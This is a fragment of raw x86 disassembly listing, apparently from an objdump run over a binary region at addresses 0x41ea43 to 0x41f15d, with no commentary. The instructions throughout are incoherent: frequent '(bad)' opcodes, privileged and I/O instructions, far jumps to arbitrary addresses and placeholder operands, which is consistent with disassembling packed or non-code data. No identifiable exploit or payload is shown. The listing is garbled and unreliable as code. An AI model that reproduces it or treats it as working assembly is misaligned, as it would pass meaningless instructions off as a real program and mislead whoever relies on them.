  41ea43:	cli    
  41ea44:	mov    BYTE PTR [edx-0x7ff9bf96],cl
  41ea4a:	pop    ebx
  41ea4b:	mov    al,0x89
  41ea4d:	stos   BYTE PTR es:[edi],al
  41ea4e:	xchg   BYTE PTR [esi-0x49],cl
  41ea51:	dec    ebx
  41ea52:	rcl    ecx,1
  41ea54:	xor    al,0x1a
  41ea56:	sbb    ecx,DWORD PTR [edx+0x4ae41083]
  41ea5c:	data16 jns 0x41ea98
  41ea5f:	ins    BYTE PTR es:[edi],dx
  41ea60:	jbe    0x41ea8c
  41ea62:	cmp    al,0x5
  41ea64:	dec    esp
  41ea65:	push   0xda67a1c9
  41ea6a:	inc    eax
  41ea6b:	retf   0x4697
  41ea6e:	(bad)  
  41ea6f:	fisub  WORD PTR [ecx+0x6bd3802f]
  41ea75:	std    
  41ea76:	sbb    eax,0xf6f47986
  41ea7b:	pop    eax
  41ea7c:	mov    esp,0x348b2c32
  41ea81:	sbb    ch,ah
  41ea83:	ss mov bl,0x8d
  41ea86:	repz mov esp,0x35949c91
  41ea8c:	adc    DWORD PTR ds:0x85a96b47,ebx
  41ea92:	(bad)  
  41ea93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea94:	jae    0x41ea1c
  41ea96:	or     bl,BYTE PTR [ebp-0x2b26d497]
  41ea9c:	jne    0x41ea29
  41ea9e:	mov    bl,0x49
  41eaa0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaa2:	cmp    ecx,esp
  41eaa4:	or     dl,0xad
  41eaa7:	mov    ah,0xf
  41eaa9:	and    al,0xc8
  41eaab:	and    ah,BYTE PTR [esi]
  41eaad:	mov    ebp,0x2849820b
  41eab2:	mov    cl,0x87
  41eab4:	mov    fs,eax
  41eab6:	push   0x4f7ff9ac
  41eabb:	inc    ebp
  41eabc:	mov    esp,0x48146c73
  41eac1:	adc    bl,ah
  41eac3:	jbe    0x41eac4
  41eac5:	popa   
  41eac6:	push   esp
  41eac7:	les    eax,FWORD PTR cs:[edi+0x451e656f]
  41eace:	lahf   
  41eacf:	shl    BYTE PTR [edi+0x671ea342],1
  41ead5:	jmp    0x41eafe
  41ead7:	cmp    DWORD PTR [esp+ebp*4-0x3d],ecx
  41eadb:	rcr    DWORD PTR [ecx+0x7439d5bd],1
  41eae1:	mov    ebp,0x17f1486c
  41eae6:	fwait
  41eae7:	xchg   esi,eax
  41eae8:	jnp    0x41eabe
  41eaea:	pop    es
  41eaeb:	cli    
  41eaec:	pop    esp
  41eaed:	test   al,0x82
  41eaef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaf0:	inc    esp
  41eaf1:	cmp    dh,ah
  41eaf3:	mov    esp,0xd0e09e20
  41eaf8:	jno    0x41eace
  41eafa:	ins    DWORD PTR es:[edi],dx
  41eafb:	test   esi,esp
  41eafd:	icebp  
  41eafe:	sti    
  41eaff:	sub    edi,DWORD PTR [eax]
  41eb01:	iret   
  41eb02:	inc    ebx
  41eb03:	add    ebx,DWORD PTR es:[ebx]
  41eb06:	(bad)  
  41eb07:	sbb    BYTE PTR [ebp+0x449d37c3],bl
  41eb0d:	fisttp WORD PTR [esi-0x50]
  41eb10:	loop   0x41eb5d
  41eb12:	push   0x5b7a168d
  41eb17:	nop
  41eb18:	mov    edx,0xfa23018f
  41eb1d:	cwde   
  41eb1e:	pop    edi
  41eb1f:	ins    DWORD PTR es:[edi],dx
  41eb20:	or     dl,BYTE PTR [edi]
  41eb22:	lods   al,BYTE PTR ds:[esi]
  41eb23:	clc    
  41eb24:	add    al,0x8a
  41eb26:	adc    DWORD PTR [esi+0x4c],eax
  41eb29:	pop    ebx
  41eb2a:	inc    ecx
  41eb2b:	mov    al,BYTE PTR [eax+0x3eaea549]
  41eb31:	and    al,0x49
  41eb33:	repz jle 0x41eaf3
  41eb36:	or     eax,0x8537cd22
  41eb3b:	jns    0x41eb9d
  41eb3d:	addr16 pop esp
  41eb3f:	jmp    0x41ead8
  41eb41:	pop    ecx
  41eb42:	out    dx,eax
  41eb43:	and    eax,0x5dd0b7ee
  41eb48:	into   
  41eb49:	ja     0x41eb96
  41eb4b:	in     eax,dx
  41eb4c:	cwde   
  41eb4d:	mov    WORD PTR [edx],cs
  41eb4f:	add    al,cl
  41eb51:	cmp    ebp,DWORD PTR [eax-0x66fc8fe7]
  41eb57:	sub    al,BYTE PTR [esi+edi*1]
  41eb5a:	dec    edx
  41eb5b:	(bad)  
  41eb5c:	sub    eax,0x723bfd5
  41eb61:	ret    
  41eb62:	stos   BYTE PTR es:[edi],al
  41eb63:	jg     0x41ebbb
  41eb65:	popf   
  41eb66:	jmp    0x41eb1e
  41eb68:	push   edx
  41eb69:	and    edi,ecx
  41eb6b:	push   esi
  41eb6c:	jo     0x41eb49
  41eb6e:	xor    BYTE PTR [ecx],ah
  41eb70:	jmp    0x41eb7e
  41eb72:	jle    0x41eb17
  41eb74:	(bad)  
  41eb75:	iret   
  41eb76:	clc    
  41eb77:	aad    0xee
  41eb79:	pop    esp
  41eb7a:	hlt    
  41eb7b:	jge    0x41eb8f
  41eb7d:	cld    
  41eb7e:	sbb    ebp,ecx
  41eb80:	push   ebp
  41eb81:	and    dl,dl
  41eb83:	mov    ?,ecx
  41eb85:	sbb    dl,bl
  41eb87:	iret   
  41eb88:	mov    ds:0x62114e0a,eax
  41eb8d:	jecxz  0x41ebc3
  41eb8f:	sub    edi,ecx
  41eb91:	xor    al,BYTE PTR [ebp+0x7b]
  41eb94:	cs sahf 
  41eb96:	loop   0x41ec09
  41eb98:	ds popf 
  41eb9a:	sbb    eax,0xf5a3b5e2
  41eb9f:	shl    DWORD PTR [esp+ebp*1-0x26],1
  41eba3:	aam    0x30
  41eba5:	push   esi
  41eba6:	and    DWORD PTR [edx+0x5554e83e],edi
  41ebac:	shl    BYTE PTR [ebp+edx*1+0x214e96c9],cl
  41ebb3:	push   eax
  41ebb4:	dec    ebx
  41ebb5:	push   DWORD PTR [eax]
  41ebb7:	ja     0x41eb58
  41ebb9:	push   edi
  41ebba:	sbb    edi,DWORD PTR [esp+esi*8]
  41ebbd:	ja     0x41ebf0
  41ebbf:	and    eax,0xee2eba18
  41ebc4:	jmp    0x16a2:0xd0ed6e9
  41ebcb:	or     al,0xf3
  41ebcd:	daa    
  41ebce:	in     al,dx
  41ebcf:	in     eax,0xa9
  41ebd1:	push   esi
  41ebd2:	int3   
  41ebd3:	in     al,0x6a
  41ebd5:	hlt    
  41ebd6:	sti    
  41ebd7:	retf   0xe4d0
  41ebda:	add    eax,0xe3ea5030
  41ebdf:	xchg   edx,eax
  41ebe0:	lods   al,BYTE PTR ds:[esi]
  41ebe1:	dec    eax
  41ebe2:	stc    
  41ebe3:	cmp    al,0xce
  41ebe5:	in     eax,dx
  41ebe6:	add    BYTE PTR [ebp+0xe],bl
  41ebe9:	(bad)  
  41ebea:	jmp    0x3e2fef03
  41ebef:	mov    ch,0xeb
  41ebf1:	xchg   dl,bh
  41ebf3:	adc    ah,al
  41ebf5:	repz xor al,0x38
  41ebf8:	adc    al,dh
  41ebfa:	mov    ebx,0x2e5c23f2
  41ebff:	mov    DWORD PTR [ecx],ebp
  41ec01:	dec    edx
  41ec02:	pop    ebp
  41ec03:	mov    bh,BYTE PTR [edx-0x6c]
  41ec06:	fidiv  DWORD PTR [esi-0x5e12287a]
  41ec0c:	mov    ?,ebx
  41ec0e:	add    ecx,DWORD PTR [esi+esi*8+0x1bc18e77]
  41ec15:	in     eax,dx
  41ec16:	mov    eax,0xf7f2754a
  41ec1b:	and    eax,0x5391bcd0
  41ec20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec21:	cwde   
  41ec22:	add    ch,dl
  41ec24:	outs   dx,DWORD PTR ds:[esi]
  41ec25:	jge    0x41ebec
  41ec27:	mov    al,BYTE PTR [ebx-0x641b0cc7]
  41ec2d:	and    dl,BYTE PTR [ebp-0x13]
  41ec30:	dec    ebp
  41ec31:	pop    ebx
  41ec32:	enter  0x3738,0x94
  41ec36:	dec    esp
  41ec37:	(bad)  
  41ec38:	out    dx,al
  41ec39:	sbb    BYTE PTR [eax],ah
  41ec3b:	mov    ch,BYTE PTR [ecx-0x5b]
  41ec3e:	loop   0x41ec93
  41ec40:	(bad)  
  41ec41:	aam    0x92
  41ec43:	repz pop esi
  41ec45:	(bad)  
  41ec46:	rol    BYTE PTR [ecx],1
  41ec48:	outs   dx,BYTE PTR ds:[esi]
  41ec49:	fs inc esi
  41ec4b:	mov    ecx,0x633b96a8
  41ec50:	sub    DWORD PTR [edx],esi
  41ec52:	jl     0x41ec72
  41ec54:	jnp    0x41ec64
  41ec56:	inc    ebx
  41ec57:	push   eax
  41ec58:	mov    edx,DWORD PTR [edi-0x27]
  41ec5b:	jp     0x41ebe6
  41ec5d:	rol    bl,cl
  41ec5f:	dec    edi
  41ec60:	xchg   esp,ebp
  41ec62:	jnp    0x41ec11
  41ec64:	jnp    0x41ec78
  41ec66:	scas   al,BYTE PTR es:[edi]
  41ec67:	js     0x41ec31
  41ec69:	pop    ss
  41ec6a:	jg     0x41ec1f
  41ec6c:	xchg   BYTE PTR [ebp-0x4a],ch
  41ec6f:	jge    0x41ecac
  41ec71:	inc    esp
  41ec72:	sub    DWORD PTR [ebx],edi
  41ec74:	and    ebp,DWORD PTR [eax+eiz*2]
  41ec77:	cmp    ebp,DWORD PTR [edx]
  41ec79:	mov    esi,0xfc65731c
  41ec7e:	lds    edx,FWORD PTR [edx]
  41ec80:	popa   
  41ec81:	icebp  
  41ec82:	mov    dl,0x32
  41ec84:	mov    edx,0x2bd46413
  41ec89:	repz push ecx
  41ec8b:	dec    ebp
  41ec8c:	bound  edx,QWORD PTR [eax]
  41ec8e:	xchg   edx,eax
  41ec8f:	sbb    eax,0x1ec5fd54
  41ec94:	fwait
  41ec95:	mov    al,0xfb
  41ec97:	pop    ebx
  41ec98:	xlat   BYTE PTR ds:[ebx]
  41ec99:	mov    ecx,0x5d6b4823
  41ec9e:	xor    edi,esi
  41eca0:	pop    edi
  41eca1:	mov    bl,0x61
  41eca3:	(bad)  
  41eca5:	clc    
  41eca6:	mov    ebx,ds
  41eca8:	ss pusha 
  41ecaa:	adc    eax,0x6e3fe439
  41ecaf:	push   0x21
  41ecb1:	std    
  41ecb2:	mov    eax,ds:0x1a16b46
  41ecb7:	popf   
  41ecb8:	aaa    
  41ecb9:	adc    cl,BYTE PTR [edi+ecx*4]
  41ecbc:	jp     0x41eca8
  41ecbe:	sbb    eax,0x16ae7f49
  41ecc3:	dec    edi
  41ecc4:	aam    0x18
  41ecc6:	or     dl,dl
  41ecc8:	ret    0x60f1
  41eccb:	xchg   DWORD PTR [edx-0x7383ebf],esp
  41ecd1:	lods   eax,DWORD PTR gs:[esi]
  41ecd3:	out    dx,eax
  41ecd4:	push   ds
  41ecd5:	or     edx,eax
  41ecd7:	test   eax,0xfc571883
  41ecdc:	inc    eax
  41ecdd:	push   ebp
  41ecde:	retf   
  41ecdf:	(bad)  
  41ece0:	adc    BYTE PTR [eax+0x7381f809],al
  41ece6:	aad    0xbe
  41ece8:	xchg   ecx,eax
  41ece9:	and    eax,0x8ab3fa43
  41ecee:	enter  0xa0ca,0x93
  41ecf2:	(bad)  
  41ecf3:	out    dx,al
  41ecf4:	fwait
  41ecf5:	imul   edi,DWORD PTR [eax],0xffffff9b
  41ecf8:	xchg   edi,eax
  41ecf9:	call   0x677ccbd
  41ecfe:	inc    edx
  41ecff:	outs   dx,DWORD PTR ds:[esi]
  41ed00:	stos   DWORD PTR es:[edi],eax
  41ed01:	repz jmp 0xb08ddf2e
  41ed07:	and    esp,ecx
  41ed09:	cs daa 
  41ed0b:	push   ss
  41ed0c:	(bad)  
  41ed0d:	fadd   st,st(6)
  41ed0f:	jno    0x41ed89
  41ed11:	aas    
  41ed12:	add    eax,0xc9799810
  41ed17:	push   0xffffff85
  41ed19:	dec    BYTE PTR [eax]
  41ed1b:	fcmovnu st,st(5)
  41ed1d:	jnp    0x41ed97
  41ed1f:	test   eax,edi
  41ed21:	dec    ecx
  41ed22:	adc    eax,ebx
  41ed24:	pop    esi
  41ed25:	pusha  
  41ed26:	lea    ebp,[eax]
  41ed28:	and    DWORD PTR [ebx],0xffffffcf
  41ed2b:	or     edx,DWORD PTR [edx]
  41ed2d:	test   DWORD PTR [edx-0x26610237],eax
  41ed33:	dec    ecx
  41ed34:	or     BYTE PTR [edx-0x276dfbb8],bl
  41ed3a:	or     ecx,ebx
  41ed3c:	and    esi,DWORD PTR [eax-0x9]
  41ed3f:	fldcw  WORD PTR [esi-0x69]
  41ed42:	enter  0x5399,0xa9
  41ed46:	xchg   edx,eax
  41ed47:	bound  eax,QWORD PTR [ebp+0x18]
  41ed4a:	inc    ebx
  41ed4b:	vpshlw ymm5,xmm2,[esi-0x55]
  41ed51:	xchg   ecx,eax
  41ed52:	mov    dl,0x6f
  41ed54:	sbb    dh,BYTE PTR [ebx-0x2312207f]
  41ed5a:	in     al,dx
  41ed5b:	ja     0x41ed63
  41ed5d:	mov    ah,0xda
  41ed5f:	mov    eax,ds:0xe7a0da0c
  41ed64:	xchg   edi,eax
  41ed65:	fisttp DWORD PTR [edx-0x9]
  41ed68:	jmp    0x56c4822a
  41ed6d:	iret   
  41ed6e:	int3   
  41ed6f:	nop
  41ed70:	xlat   BYTE PTR ds:[ebx]
  41ed71:	jo     0x41ed0d
  41ed73:	jmp    0xddf15bf5
  41ed78:	data16 aaa 
  41ed7a:	xchg   ecx,eax
  41ed7b:	xor    BYTE PTR [edi],bh
  41ed7d:	mov    al,BYTE PTR [esi+0x23a46996]
  41ed83:	dec    ecx
  41ed84:	jnp    0x41ed51
  41ed86:	xor    ecx,ecx
  41ed88:	daa    
  41ed89:	mov    cl,0xb2
  41ed8b:	pop    esi
  41ed8c:	cmp    DWORD PTR [eax-0x51a5b6f4],ebp
  41ed92:	and    ebp,esp
  41ed94:	bound  edx,QWORD PTR [eax-0x50]
  41ed97:	jns    0x41edea
  41ed99:	loopne 0x41ed60
  41ed9b:	pop    ebx
  41ed9c:	call   0x46a8:0xf8f838ec
  41eda3:	push   edi
  41eda4:	ret    
  41eda5:	and    al,BYTE PTR [esi-0x33707c2c]
  41edab:	lods   al,BYTE PTR ds:[esi]
  41edac:	or     esi,DWORD PTR [esi-0x49]
  41edaf:	lods   al,BYTE PTR ds:[esi]
  41edb0:	jnp    0x41ed7b
  41edb2:	xor    ebp,DWORD PTR [ebp+0x4b]
  41edb5:	cmp    eax,0x8dea54e1
  41edba:	add    bh,BYTE PTR [edx+ecx*8]
  41edbd:	jno    0x41ed43
  41edbf:	xchg   DWORD PTR [ebx-0x5d325b2c],ebx
  41edc5:	inc    esp
  41edc6:	push   eax
  41edc7:	inc    edi
  41edc8:	mov    dh,BYTE PTR [ecx]
  41edca:	ins    BYTE PTR es:[edi],dx
  41edcb:	stos   DWORD PTR es:[edi],eax
  41edcc:	or     edx,DWORD PTR [ecx+ecx*2+0x61]
  41edd0:	aam    0x6e
  41edd2:	jmp    0x93d880d6
  41edd7:	test   BYTE PTR [ebp+eiz*8+0x7319d262],bh
  41edde:	out    0x65,eax
  41ede0:	jns    0x41ee21
  41ede2:	mov    WORD PTR [eax-0x7f],es
  41ede5:	(bad)  
  41ede6:	es jl  0x41edc2
  41ede9:	push   ecx
  41edea:	mov    esi,0x3441bbd4
  41edef:	test   eax,0x4009769a
  41edf4:	in     al,0xc4
  41edf6:	or     al,0x47
  41edf8:	jp     0x41edec
  41edfa:	fistp  DWORD PTR [eax]
  41edfc:	inc    eax
  41edfd:	repnz test al,0x4a
  41ee00:	mov    ds:0x3169f0e6,al
  41ee05:	cmp    BYTE PTR [ebx],dh
  41ee07:	call   0xb13149bb
  41ee0c:	iret   
  41ee0d:	mov    ds:0xf5b00b6c,al
  41ee12:	xchg   esp,edi
  41ee14:	pushf  
  41ee15:	mov    cl,0xee
  41ee17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee18:	mov    cl,BYTE PTR ds:0xd5db017a
  41ee1e:	inc    edi
  41ee1f:	das    
  41ee20:	xchg   edi,eax
  41ee21:	push   esp
  41ee22:	pop    ds
  41ee23:	cmp    BYTE PTR [eax-0x39628835],cl
  41ee29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee2a:	jmp    0x41ee5e
  41ee2c:	mov    bh,0x9a
  41ee2e:	out    dx,eax
  41ee2f:	xor    esp,DWORD PTR [esi+0x4f]
  41ee32:	jp     0x41ee3e
  41ee34:	scas   al,BYTE PTR es:[edi]
  41ee35:	jnp    0x41ee11
  41ee37:	push   0xffffffb6
  41ee39:	fst    QWORD PTR [ebx+0x66]
  41ee3c:	or     eax,0x5102f5a0
  41ee41:	daa    
  41ee42:	cmp    eax,0xb79a0d70
  41ee47:	call   0x1cf7c16d
  41ee4c:	add    eax,0x618a7ac4
  41ee51:	pop    eax
  41ee52:	mov    eax,0x334826e
  41ee57:	jp     0x41eeb0
  41ee59:	into   
  41ee5a:	jge    0x41ee3c
  41ee5c:	cmp    eax,0x20544edb
  41ee61:	mov    cl,0xd4
  41ee63:	mov    bh,0xc8
  41ee65:	fisttp DWORD PTR [edi]
  41ee67:	dec    esi
  41ee68:	icebp  
  41ee69:	fidivr DWORD PTR [esi]
  41ee6b:	sbb    ch,BYTE PTR [ebx]
  41ee6d:	push   edi
  41ee6e:	stc    
  41ee6f:	ja     0x41eea6
  41ee71:	lea    ebp,[edi]
  41ee73:	mov    ebp,edi
  41ee75:	stos   BYTE PTR es:[edi],al
  41ee76:	das    
  41ee77:	les    esi,FWORD PTR [edx+0x28]
  41ee7a:	int3   
  41ee7b:	xchg   esi,eax
  41ee7c:	jp     0x41ee20
  41ee7e:	mov    ds:0x1c2c102e,al
  41ee83:	jmp    0x6c649e15
  41ee88:	pushf  
  41ee89:	repnz pop esp
  41ee8b:	aad    0x8
  41ee8d:	jl     0x41eecd
  41ee8f:	or     ah,bh
  41ee91:	mov    dh,0x6c
  41ee93:	in     eax,dx
  41ee94:	(bad)  
  41ee95:	idiv   ah
  41ee97:	jp     0x41eeb6
  41ee99:	sbb    DWORD PTR [esp+ebx*2+0x5c],0xffffff9d
  41ee9e:	lock in eax,0x6b
  41eea1:	ja     0x41eee0
  41eea3:	sbb    al,0x27
  41eea5:	pop    esp
  41eea6:	rcr    BYTE PTR ds:0x9ff15a2f,0xc0
  41eead:	add    edx,esi
  41eeaf:	jle    0x41ee8e
  41eeb1:	cmp    DWORD PTR [edx],ebx
  41eeb3:	mov    eax,ds:0x389d8d7d
  41eeb8:	loop   0x41ee91
  41eeba:	mov    bh,0x59
  41eebc:	dec    eax
  41eebd:	xor    ch,BYTE PTR [ebp-0x2b2ca08c]
  41eec3:	(bad)  
  41eec4:	mov    al,0xf6
  41eec6:	shr    DWORD PTR [esi],1
  41eec8:	pop    ecx
  41eec9:	inc    edi
  41eeca:	inc    ebx
  41eecb:	gs sbb al,0xcd
  41eece:	lds    edx,FWORD PTR [esi+0xfa5a986]
  41eed4:	add    ecx,edx
  41eed6:	(bad)  
  41eed7:	xor    bh,al
  41eed9:	sub    DWORD PTR [edx],edx
  41eedb:	std    
  41eedc:	call   0xffff:0xd8369e10
  41eee3:	push   edi
  41eee4:	aaa    
  41eee5:	inc    eax
  41eee6:	sbb    al,0x92
  41eee8:	pop    eax
  41eee9:	jbe    0x41ee81
  41eeeb:	dec    ebp
  41eeec:	xchg   esi,eax
  41eeed:	push   ds
  41eeee:	mov    edi,0xbab2a991
  41eef3:	ret    
  41eef4:	ds jb  0x41eea2
  41eef7:	pop    edx
  41eef8:	test   eax,0x3712a2ac
  41eefd:	fcmove st,st(0)
  41eeff:	sub    DWORD PTR [ecx],ebx
  41ef01:	jbe    0x41ef5d
  41ef03:	mov    ebx,0x653feca4
  41ef08:	cmp    BYTE PTR [edx],0x47
  41ef0b:	int    0x53
  41ef0d:	inc    ebx
  41ef0e:	sub    esi,DWORD PTR [edi-0xf]
  41ef11:	lahf   
  41ef12:	pop    ds
  41ef13:	arpl   WORD PTR [eax-0x6e],sp
  41ef16:	fstp   TBYTE PTR [edi+0x11]
  41ef19:	mov    bh,0x3
  41ef1b:	sbb    bl,BYTE PTR [esi]
  41ef1d:	repnz or BYTE PTR [edx-0x13],dh
  41ef21:	and    eax,0xbd6a45e2
  41ef26:	inc    ecx
  41ef27:	sub    DWORD PTR [esi],ecx
  41ef29:	shl    DWORD PTR [eax],0xd2
  41ef2c:	and    dl,bh
  41ef2e:	enter  0x56a4,0x73
  41ef32:	sbb    edi,ebx
  41ef34:	sar    BYTE PTR [edx+eiz*8+0x27a1e11c],1
  41ef3b:	push   ecx
  41ef3c:	pop    ds
  41ef3d:	ret    
  41ef3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef3f:	lods   al,BYTE PTR ds:[esi]
  41ef40:	mov    dl,0xa6
  41ef42:	jno    0x41eede
  41ef44:	jo     0x41ef39
  41ef46:	push   0xe07b5f58
  41ef4b:	enter  0xe6b5,0xd9
  41ef4f:	fwait
  41ef50:	dec    esp
  41ef51:	push   ecx
  41ef52:	xor    al,0x62
  41ef54:	pop    eax
  41ef55:	fldcw  WORD PTR [ecx]
  41ef57:	dec    edx
  41ef58:	cs in  eax,0x0
  41ef5b:	aaa    
  41ef5c:	inc    eax
  41ef5d:	and    al,BYTE PTR [ebx-0x55bc91ff]
  41ef63:	jns    0x41ef60
  41ef65:	and    eax,0x9d5d2c35
  41ef6a:	mov    ds:0x1ea549f5,eax
  41ef6f:	lea    sp,[eax+0x2c]
  41ef73:	hlt    
  41ef74:	xchg   edi,eax
  41ef75:	imul   esi,DWORD PTR [ebx+0x3bf64173],0x4f
  41ef7c:	or     DWORD PTR [eax-0x585222a4],eax
  41ef82:	xor    eax,0xee7e5f06
  41ef87:	jmp    0x8ffc9f09
  41ef8c:	jl     0x41efec
  41ef8e:	mov    al,ds:0x85ba6e7c
  41ef93:	push   eax
  41ef94:	mov    eax,ds:0x646712b8
  41ef99:	xor    eax,DWORD PTR ds:0x5114a5b2
  41ef9f:	lock bound esp,QWORD PTR [edx+ebp*1-0x3d]
  41efa4:	sub    BYTE PTR [eax],bh
  41efa6:	mov    ah,0x87
  41efa8:	inc    eax
  41efa9:	ds jnp 0x41ef64
  41efac:	add    ch,cl
  41efae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efaf:	lea    ebx,[ebp-0x1b]
  41efb2:	pop    eax
  41efb3:	rcl    DWORD PTR [eax],0xd6
  41efb6:	pop    ebp
  41efb7:	icebp  
  41efb8:	enter  0x5ff8,0xeb
  41efbc:	xchg   ebp,eax
  41efbd:	sar    dh,1
  41efbf:	dec    edx
  41efc0:	mov    edx,0x8326d802
  41efc5:	dec    ecx
  41efc6:	inc    ebx
  41efc7:	mov    cl,0xd7
  41efc9:	imul   ecx,DWORD PTR [ebp-0x1a1f553e],0xc1136058
  41efd3:	or     BYTE PTR [esi+0x40d661a5],cl
  41efd9:	scas   al,BYTE PTR es:[edi]
  41efda:	sub    BYTE PTR [ebx+0x313a0d0b],bh
  41efe0:	mov    ebx,0x6737a485
  41efe5:	push   ebp
  41efe6:	mov    edi,0xa9571fa6
  41efeb:	enter  0x37d2,0x7d
  41efef:	or     DWORD PTR [esi+0x79],esp
  41eff2:	call   0x1923:0x65f4fdf3
  41eff9:	sub    DWORD PTR ds:0x7e80e411,ebx
  41efff:	scas   eax,DWORD PTR es:[edi]
  41f000:	add    al,0x91
  41f002:	in     al,dx
  41f003:	xor    DWORD PTR [edi+ecx*4-0x33],ebp
  41f007:	pop    ecx
  41f008:	(bad)  
  41f009:	je     0x41f061
  41f00b:	pop    esi
  41f00c:	dec    esi
  41f00d:	int    0xb9
  41f00f:	mov    DWORD PTR [esi-0x35],ecx
  41f012:	or     eax,0x9a03662
  41f017:	xchg   DWORD PTR [esi],edi
  41f019:	clc    
  41f01a:	push   es
  41f01b:	push   eax
  41f01c:	dec    esi
  41f01d:	fwait
  41f01e:	inc    ebx
  41f01f:	es xchg edi,eax
  41f021:	fnstcw WORD PTR [eax+0x7c]
  41f024:	fmul   DWORD PTR [ebx+ebx*4]
  41f027:	mov    bl,0x6e
  41f029:	aas    
  41f02a:	push   edx
  41f02b:	xor    al,0xab
  41f02d:	mov    al,ds:0x4f68d0e8
  41f032:	aas    
  41f033:	lds    esp,FWORD PTR [ebx+0x5e]
  41f036:	hlt    
  41f037:	(bad)  
  41f039:	mov    ecx,0x5ac5fda7
  41f03e:	add    eax,0x72f09fbf
  41f043:	fadd   QWORD PTR [esi-0x80]
  41f046:	leave  
  41f047:	sbb    esi,DWORD PTR [edx]
  41f049:	(bad)  
  41f04a:	sbb    edx,DWORD PTR [ebp-0x7f]
  41f04d:	xchg   ebx,eax
  41f04e:	fnstsw WORD PTR [edi]
  41f050:	(bad)
  41f053:	outs   dx,DWORD PTR ds:[esi]
  41f054:	jbe    0x41f032
  41f056:	ins    BYTE PTR es:[edi],dx
  41f057:	idiv   BYTE PTR [eax+0x4e]
  41f05a:	add    al,0x3a
  41f05c:	fcom   st(5)
  41f05e:	ret    0x9316
  41f061:	push   esi
  41f062:	cwde   
  41f063:	inc    ecx
  41f064:	xchg   ebp,eax
  41f065:	fld    DWORD PTR [edx]
  41f067:	out    dx,al
  41f068:	jns    0x41f0db
  41f06a:	hlt    
  41f06b:	cld    
  41f06c:	leave  
  41f06d:	dec    ebx
  41f06e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f06f:	sti    
  41f070:	fsubr  QWORD PTR [eax-0x39]
  41f073:	je     0x41f05e
  41f075:	xor    ebp,0x42
  41f078:	fst    DWORD PTR [esi+0x36]
  41f07b:	pushf  
  41f07c:	pusha  
  41f07d:	xor    eax,0xa89572b
  41f082:	int    0xf8
  41f084:	in     eax,dx
  41f085:	ficom  WORD PTR [ebp+eax*8+0x20]
  41f089:	sti    
  41f08a:	or     edx,DWORD PTR [edx+0x62]
  41f08d:	aam    0x7e
  41f08f:	jo     0x41f0c2
  41f091:	add    ecx,DWORD PTR [ecx+ecx*2]
  41f094:	push   ebp
  41f095:	into   
  41f096:	jmp    0xd933d469
  41f09b:	jo     0x41f083
  41f09d:	push   eax
  41f09e:	dec    edx
  41f09f:	ins    BYTE PTR es:[edi],dx
  41f0a0:	xlat   BYTE PTR ds:[ebx]
  41f0a1:	mov    ebp,0x192c8205
  41f0a6:	lods   eax,DWORD PTR ds:[esi]
  41f0a7:	cmc    
  41f0a8:	out    dx,al
  41f0a9:	sti    
  41f0aa:	lods   eax,DWORD PTR ds:[esi]
  41f0ab:	gs ja  0x41f05a
  41f0ae:	retf   
  41f0af:	enter  0xb51b,0xe
  41f0b3:	(bad)  
  41f0b4:	cli    
  41f0b5:	cmp    ecx,esi
  41f0b7:	aas    
  41f0b8:	adc    DWORD PTR [ebx],esi
  41f0ba:	sbb    ah,al
  41f0bc:	dec    ebp
  41f0bd:	je     0x41f042
  41f0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0c0:	out    dx,al
  41f0c1:	out    dx,eax
  41f0c2:	add    DWORD PTR [ecx+0x7f42570d],ebp
  41f0c8:	xchg   ebx,eax
  41f0c9:	cld    
  41f0ca:	cli    
  41f0cb:	inc    edx
  41f0cc:	push   ss
  41f0cd:	outs   dx,BYTE PTR ds:[esi]
  41f0ce:	pop    ss
  41f0cf:	pop    es
  41f0d0:	ret    
  41f0d1:	jg     0x41f05f
  41f0d3:	mov    ch,0xd
  41f0d5:	inc    ecx
  41f0d6:	fmul   st(6),st
  41f0d8:	vxorpd xmm3,xmm4,xmm7
  41f0dc:	repz adc ebx,edi
  41f0df:	mov    esi,0x47e9c46d
  41f0e4:	std    
  41f0e5:	inc    esi
  41f0e6:	jo     0x41f08f
  41f0e8:	js     0x41f095
  41f0ea:	out    0x9f,al
  41f0ec:	nop
  41f0ed:	ret    0x3441
  41f0f0:	sbb    cl,BYTE PTR [esi-0x56f03ac0]
  41f0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0f7:	sub    cl,BYTE PTR [esi+0xb]
  41f0fa:	clc    
  41f0fb:	scas   al,BYTE PTR es:[edi]
  41f0fc:	inc    ebx
  41f0fd:	ins    BYTE PTR es:[edi],dx
  41f0fe:	out    0x8e,eax
  41f100:	das    
  41f101:	inc    ebx
  41f102:	fsubr  st(1),st
  41f104:	push   ebp
  41f105:	push   esp
  41f106:	int3   
  41f107:	pop    es
  41f108:	pop    es
  41f109:	ret    
  41f10a:	xchg   esi,eax
  41f10b:	clc    
  41f10c:	in     eax,0xbb
  41f10e:	mov    bl,0xeb
  41f110:	add    DWORD PTR [esi-0x65],ecx
  41f113:	adc    DWORD PTR [esi-0x3b],0x9a2ffa20
  41f11a:	lea    edx,[edx+0x368d6070]
  41f120:	adc    BYTE PTR [ecx],bh
  41f122:	jle    0x41f0da
  41f124:	jmp    0x64bfe0c
  41f129:	sub    cl,ch
  41f12b:	mov    dh,0xb5
  41f12d:	adc    BYTE PTR [ecx],dl
  41f12f:	and    BYTE PTR [eax],dh
  41f131:	outs   dx,DWORD PTR ds:[esi]
  41f132:	cld    
  41f133:	out    0x87,al
  41f135:	jg     0x41f184
  41f137:	cwde   
  41f138:	clc    
  41f139:	sub    BYTE PTR [edi-0x33f494ec],ah
  41f13f:	bound  eax,QWORD PTR [ebx]
  41f141:	test   DWORD PTR [edx+0x1caf92b9],edx
  41f147:	addr16 cli 
  41f149:	call   0x6decf771
  41f14e:	push   es
  41f14f:	jmp    0x79f5:0x15544c4f
  41f156:	mov    eax,0xf33f82c2
  41f15b:	and    al,0x1c
  41f15d:	cwde   
